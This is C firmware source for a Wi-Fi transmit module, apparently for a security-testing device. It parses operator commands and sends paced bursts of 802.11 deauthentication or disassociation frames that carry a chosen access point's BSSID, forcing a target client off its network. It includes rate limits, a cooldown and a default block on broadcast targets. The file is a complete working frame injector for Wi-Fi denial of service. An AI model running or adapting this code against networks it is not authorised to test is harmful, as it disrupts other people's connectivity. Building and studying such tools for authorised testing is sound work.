#include "tx_test.h"

#include <stdio.h>
#include <string.h>

#include "wraith_config.h"

const uint8_t TX_CLIENT_BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

static event_sink_t s_sink;
static const tx_radio_ops_t *s_ops; /* NULL = feature disabled at runtime */
static tx_state_t s_state;
static tx_request_t s_req;
static uint8_t s_remaining;
static uint16_t s_sent;
static uint32_t s_next_frame_ms;
static uint32_t s_cooldown_until;
static uint16_t s_seq_ctrl = 0x0010; /* sequence 1, fragment 0 */
static uint32_t s_total_sent, s_total_rejected;

static bool addr_is_multicast(const uint8_t a[6]) { return (a[0] & 0x01) != 0; }
static bool addr_is_zero(const uint8_t a[6]) { return (a[0] | a[1] | a[2] | a[3] | a[4] | a[5]) == 0; }
static bool addr_is_broadcast(const uint8_t a[6]) { return memcmp(a, TX_CLIENT_BROADCAST, 6) == 0; }

static void set_state(tx_state_t st)
{
    s_state = st;
}

void tx_init(const event_sink_t *sink, const tx_radio_ops_t *ops)
{
    s_sink = sink ? *sink : (event_sink_t){0};
    s_ops = ops;
    s_state = TX_IDLE;
    s_total_sent = s_total_rejected = 0;
    s_cooldown_until = 0;
}

/* ---- serialization ---- */

static uint32_t emit_seq(void) { return s_sink.next_seq ? s_sink.next_seq(s_sink.ctx) : 0; }

static void emit_line(char *buf, size_t len)
{
    if (len > 0 && s_sink.emit) {
        s_sink.emit(buf, len, s_sink.ctx);
    }
}

static void emit_ack(uint32_t seq, const char *command, const char *status, const char *detail,
                     const uint8_t *bssid, const uint8_t *client)
{
    char buf[WRAITH_MAX_MESSAGE];
    char mac[18];
    json_writer_t jw;
    if (s_sink.id == NULL) {
        return; /* not initialized (host link can start before tx_test_init) */
    }
    jw_init(&jw, buf, sizeof buf);
    proto_begin(&jw, s_sink.id, EVT_TX_ACK, seq, -1, bssid);
    jw_kv_string(&jw, "command", command);
    jw_kv_string(&jw, "status", status);
    if (detail != NULL && detail[0] != '\0') {
        char d[129];
        snprintf(d, sizeof d, "%s", detail); /* protocol limit: 128 bytes */
        jw_kv_string(&jw, "detail", d);
    }
    if (client != NULL) {
        proto_format_mac(mac, client);
        jw_kv_string(&jw, "client", mac);
    }
    emit_line(buf, proto_end(&jw));
}

static void emit_report(const char *outcome, int channel, uint32_t now)
{
    char buf[WRAITH_MAX_MESSAGE];
    char mac[18];
    json_writer_t jw;
    if (s_sink.id == NULL) {
        s_cooldown_until = now + WRAITH_TX_COOLDOWN_MS;
        set_state(TX_COOLDOWN);
        return;
    }
    jw_init(&jw, buf, sizeof buf);
    proto_begin(&jw, s_sink.id, EVT_TX_REPORT, emit_seq(), channel, s_req.bssid);
    jw_kv_string(&jw, "command", tx_kind_name(s_req.kind));
    proto_format_mac(mac, s_req.client);
    jw_kv_string(&jw, "client", mac);
    jw_kv_uint(&jw, "reason", s_req.reason);
    jw_kv_uint(&jw, "sent", s_sent);
    jw_kv_uint(&jw, "requested", s_req.count);
    jw_kv_string(&jw, "outcome", outcome);
    emit_line(buf, proto_end(&jw));

    s_cooldown_until = now + WRAITH_TX_COOLDOWN_MS;
    set_state(TX_COOLDOWN);
}

/* ---- frame builder ---- */

void tx_build_frame(const tx_request_t *req, uint16_t seq_ctrl, uint8_t out[TX_FRAME_LEN])
{
    memset(out, 0, TX_FRAME_LEN);
    out[0] = req->kind == TX_KIND_DEAUTH ? 0xC0 : 0xA0; /* mgmt, deauth/disassoc */
    out[1] = 0x00;                                      /* flags: not protected */
    /* duration 0: a test frame does not reserve the medium */
    memcpy(out + 4, req->client, 6); /* addr1: receiver */
    memcpy(out + 10, req->bssid, 6); /* addr2: transmitter */
    memcpy(out + 16, req->bssid, 6); /* addr3: BSSID */
    out[22] = (uint8_t)(seq_ctrl & 0xFF);
    out[23] = (uint8_t)(seq_ctrl >> 8);
    out[24] = (uint8_t)(req->reason & 0xFF);
    out[25] = (uint8_t)(req->reason >> 8);
}

/* ---- command parsing ---- */

static const char *skip_ws(const char *p)
{
    while (*p == ' ' || *p == '\t') {
        p++;
    }
    return p;
}

static bool token(const char **p, const char **start, size_t *len)
{
    *p = skip_ws(*p);
    if (**p == '\0') {
        return false;
    }
    *start = *p;
    while (**p != '\0' && **p != ' ' && **p != '\t') {
        (*p)++;
    }
    *len = (size_t)(*p - *start);
    return true;
}

static bool parse_mac(const char *s, size_t len, uint8_t out[6])
{
    /* Strict AA:BB:CC:DD:EE:FF (hex digits in either case). */
    if (len != 17) {
        return false;
    }
    for (size_t i = 0; i < 6; i++) {
        uint8_t v = 0;
        for (size_t j = 0; j < 2; j++) {
            char c = s[i * 3 + j];
            uint8_t d;
            if (c >= '0' && c <= '9') {
                d = (uint8_t)(c - '0');
            } else if (c >= 'A' && c <= 'F') {
                d = (uint8_t)(c - 'A' + 10);
            } else if (c >= 'a' && c <= 'f') {
                d = (uint8_t)(c - 'a' + 10);
            } else {
                return false;
            }
            v = (uint8_t)(v << 4 | d);
        }
        out[i] = v;
        if (i < 5 && s[i * 3 + 2] != ':') {
            return false;
        }
    }
    return true;
}

static bool parse_u16(const char *s, size_t len, long lo, long hi, uint16_t *out)
{
    if (len == 0 || len > 5) {
        return false;
    }
    long v = 0;
    for (size_t i = 0; i < len; i++) {
        if (s[i] < '0' || s[i] > '9') {
            return false;
        }
        v = v * 10 + (s[i] - '0');
        if (v > hi) {
            return false;
        }
    }
    if (v < lo) {
        return false;
    }
    *out = (uint16_t)v;
    return true;
}

const char *tx_command_word(tx_kind_t kind) { return kind == TX_KIND_DEAUTH ? "TX_DEAUTH" : "TX_DISASSOC"; }
const char *tx_kind_name(tx_kind_t kind) { return kind == TX_KIND_DEAUTH ? "deauth" : "disassoc"; }

/* Shared body: <bssid> <client> <count> <interval_ms> <reason> <channel>. */
static bool parse_body(const char *p, tx_request_t *req, char *err, size_t errcap)
{
    const char *t;
    size_t n;
    uint16_t count, interval, reason, channel;

    if (!token(&p, &t, &n) || !parse_mac(t, n, req->bssid)) {
        snprintf(err, errcap, "bssid must be AA:BB:CC:DD:EE:FF");
        return false;
    }
    if (!token(&p, &t, &n) || !parse_mac(t, n, req->client)) {
        snprintf(err, errcap, "client must be AA:BB:CC:DD:EE:FF");
        return false;
    }
    if (!token(&p, &t, &n) || !parse_u16(t, n, 1, WRAITH_TX_MAX_FRAMES, &count)) {
        snprintf(err, errcap, "count must be 1..%d", WRAITH_TX_MAX_FRAMES);
        return false;
    }
    if (!token(&p, &t, &n) || !parse_u16(t, n, WRAITH_TX_MIN_INTERVAL_MS, 60000, &interval)) {
        snprintf(err, errcap, "interval_ms must be %d..60000", WRAITH_TX_MIN_INTERVAL_MS);
        return false;
    }
    if (!token(&p, &t, &n) || !parse_u16(t, n, 0, 65535, &reason)) {
        snprintf(err, errcap, "reason must be 0..65535");
        return false;
    }
    if (!token(&p, &t, &n) || !parse_u16(t, n, 1, 14, &channel)) {
        snprintf(err, errcap, "channel must be 1..14");
        return false;
    }
    if (token(&p, &t, &n)) {
        snprintf(err, errcap, "unexpected extra argument");
        return false;
    }

    if (addr_is_zero(req->bssid) || addr_is_multicast(req->bssid)) {
        snprintf(err, errcap, "bssid must be a unicast BSSID");
        return false;
    }
    if (addr_is_zero(req->client) || addr_is_multicast(req->client)) {
        if (!(WRAITH_TX_ALLOW_BROADCAST && addr_is_broadcast(req->client))) {
            snprintf(err, errcap, "client must be unicast (broadcast disabled in this build)");
            return false;
        }
    }
    if (memcmp(req->client, req->bssid, 6) == 0) {
        snprintf(err, errcap, "client must differ from bssid");
        return false;
    }
    req->count = (uint8_t)count;
    req->interval_ms = interval;
    req->reason = reason;
    req->channel = (uint8_t)channel;
    return true;
}

bool tx_parse_command(const char *line, bool *ok, tx_request_t *req, char *err, size_t errcap)
{
    const char *p = skip_ws(line);
    size_t n;
    const char *t;
    char errbuf[64] = "malformed command";

    *ok = false;
    memset(req, 0, sizeof *req);
    if (!token(&p, &t, &n)) {
        return false;
    }
    if (n == 7 && memcmp(t, "TX_STOP", 7) == 0) {
        p = skip_ws(p);
        if (*p != '\0') {
            snprintf(errbuf, sizeof errbuf, "unexpected argument");
        } else {
            *ok = true;
        }
    } else if (n == 9 && memcmp(t, "TX_STATUS", 9) == 0) {
        p = skip_ws(p);
        if (*p != '\0') {
            snprintf(errbuf, sizeof errbuf, "unexpected argument");
        } else {
            *ok = true;
        }
    } else if ((n == 9 && memcmp(t, "TX_DEAUTH", 9) == 0) || (n == 11 && memcmp(t, "TX_DISASSOC", 11) == 0)) {
        req->kind = n == 9 ? TX_KIND_DEAUTH : TX_KIND_DISASSOC;
        if (parse_body(p, req, errbuf, sizeof errbuf)) {
            *ok = true;
        }
    } else {
        return false; /* not a TX command */
    }
    if (err != NULL) {
        snprintf(err, errcap, "%s", errbuf);
    }
    return true;
}

/* ---- submit / tick ---- */

/* "deauth" / "disassoc" / "status" from the raw command word. */
static const char *line_command(const char *line)
{
    if (strncmp(line, "TX_DISASSOC", 11) == 0) {
        return "disassoc";
    }
    if (strncmp(line, "TX_STATUS", 9) == 0) {
        return "status";
    }
    if (strncmp(line, "TX_STOP", 7) == 0) {
        return "stop";
    }
    return "deauth";
}

bool tx_command(const char *line, uint32_t now)
{
    bool ok;
    tx_request_t req;
    char err[64];

    if (!tx_parse_command(line, &ok, &req, err, sizeof err)) {
        return false; /* not a TX command: stays ignored like all other input */
    }
    if (s_sink.id == NULL) {
        return true; /* not initialized yet (host link starts first): drop */
    }
    if (!ok) {
        s_total_rejected++;
        emit_ack(emit_seq(), line_command(line), "rejected", err, NULL, NULL);
        return true;
    }
    if (strcmp(line_command(line), "status") == 0) {
        tx_report_status(now);
        return true;
    }
    if (strcmp(line_command(line), "stop") == 0) {
        tx_abort(now);
        return true;
    }
    tx_submit(&req, now); /* a rejection is acked inside tx_submit */
    return true;
}

bool tx_submit(const tx_request_t *req, uint32_t now)
{
    uint32_t seq = emit_seq();
    char detail[96];
    char mac[18];

    if (s_ops == NULL) {
        s_total_rejected++;
        snprintf(detail, sizeof detail, "transmission is not enabled in this firmware build");
        emit_ack(seq, tx_kind_name(req->kind), "rejected", detail, req->bssid, req->client);
        return false;
    }
    if (s_state == TX_ACTIVE) {
        s_total_rejected++;
        proto_format_mac(mac, s_req.bssid);
        snprintf(detail, sizeof detail, "burst to %s is already running", mac);
        emit_ack(seq, tx_kind_name(req->kind), "rejected", detail, req->bssid, req->client);
        return false;
    }
    if (s_state == TX_COOLDOWN && (int32_t)(now - s_cooldown_until) < 0) {
        s_total_rejected++;
        snprintf(detail, sizeof detail, "cooldown: retry in %d ms",
                 (int)(s_cooldown_until - now));
        emit_ack(seq, tx_kind_name(req->kind), "rejected", detail, req->bssid, req->client);
        return false;
    }

    s_req = *req;
    s_sent = 0;
    s_remaining = req->count;
    s_next_frame_ms = now; /* first frame goes out on the next tick */
    set_state(TX_ACTIVE);
    emit_ack(seq, tx_kind_name(req->kind), "accepted", NULL, req->bssid, req->client);
    return true;
}

bool tx_abort(uint32_t now)
{
    (void)now;
    uint32_t seq = emit_seq();
    if (s_state != TX_ACTIVE) {
        emit_ack(seq, "status", "accepted", "no burst running", NULL, NULL);
        return false;
    }
    char detail[96];
    snprintf(detail, sizeof detail, "burst aborted by operator; sent %u of %u", (unsigned)s_sent,
             (unsigned)s_req.count);
    emit_ack(seq, "status", "accepted", detail, s_req.bssid, s_req.client);
    set_state(TX_IDLE);
    return true;
}

bool tx_tick(uint32_t now, bool host_connected)
{
    if (s_state != TX_ACTIVE) {
        if (s_state == TX_COOLDOWN && (int32_t)(now - s_cooldown_until) >= 0) {
            set_state(TX_IDLE);
        }
        return false;
    }

    if (!host_connected) {
        /* Report the target channel (always known once a burst is active), so
         * tx.report always carries the required channel field. */
        emit_report("aborted_host_lost", s_req.channel, now);
        return false;
    }

    if (s_sent == 0) {
        /* Pin the radio to the target's channel for the whole burst. */
        if (s_ops->set_channel(s_req.channel) != 0) {
            emit_report("aborted_radio", s_req.channel, now);
            return false;
        }
    } else if ((int32_t)(now - s_next_frame_ms) < 0) {
        return true; /* pacing */
    }

    uint8_t frame[TX_FRAME_LEN];
    tx_build_frame(&s_req, s_seq_ctrl, frame);
    if (s_ops->send_frame(frame, sizeof frame) != 0) {
        emit_report("aborted_radio", s_req.channel, now);
        return false;
    }
    s_seq_ctrl += 0x10;
    s_sent++;
    s_total_sent++;

    if (s_sent >= s_req.count) {
        emit_report("complete", s_req.channel, now);
        return false;
    }
    s_next_frame_ms = now + s_req.interval_ms;
    return true;
}

void tx_report_status(uint32_t now)
{
    char detail[80];
    const char *what = s_state == TX_ACTIVE ? "active" : s_state == TX_COOLDOWN ? "cooldown" : "idle";
    snprintf(detail, sizeof detail, "%s; sent=%lu rejected=%lu", what, (unsigned long)s_total_sent,
             (unsigned long)s_total_rejected);
    emit_ack(emit_seq(), "status", "accepted", detail, NULL, NULL);
    (void)now;
}

tx_state_t tx_state(void) { return s_state; }
uint32_t tx_frames_sent(void) { return s_total_sent; }
uint32_t tx_requests_rejected(void) { return s_total_rejected; }
